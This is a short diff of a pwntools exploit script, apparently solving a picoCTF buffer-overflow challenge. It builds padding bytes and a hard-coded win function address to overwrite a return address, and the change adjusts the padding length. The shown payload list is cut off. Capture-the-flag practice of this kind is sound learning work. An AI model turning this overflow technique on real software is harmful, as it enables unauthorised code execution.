@@ -3,7 +3,7 @@ import pwn
 # p = pwn.remote("saturn.picoctf.net", 57164)
 p = pwn.process('./vuln')
 
-junk = b"A" * (36 + 8) 
+junk = b"A" * (36 + 4 + 4) 
 win_address = b"\xf6\x91\x04\x08"
 new_line = b"\n"
 pyload = [
